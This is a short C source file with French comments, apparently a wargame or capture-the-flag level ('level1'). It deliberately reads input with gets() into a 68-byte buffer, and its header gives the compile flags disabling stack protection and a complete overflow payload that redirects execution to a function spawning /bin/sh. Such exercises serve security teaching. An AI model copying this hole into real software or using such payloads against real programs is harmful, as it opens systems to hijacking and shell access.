/*
	Pour compiler le .c il faut effectuer la commande suivante:
	gcc source.c -o level1 -m32 -fno-stack-protector

	Ensuite:
	echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xc0\x84\x04\x08" > ok

	Pour finir:
	cat ./ok - | ./level1
*/
#include <stdio.h>

int		run(void)
{
	fwrite("Good... Wait what?\n", 1, 19, stdout);	// Si la fonction est bien appelée grâce au buffer overflow un message est affiché
	system("/bin/sh");	// Un shell est lancé
}

int		main()
{
	char str[68];	// Définition du buffer

	gets(str);		// Saisie de caractères et de chaînes
	return 0;
}
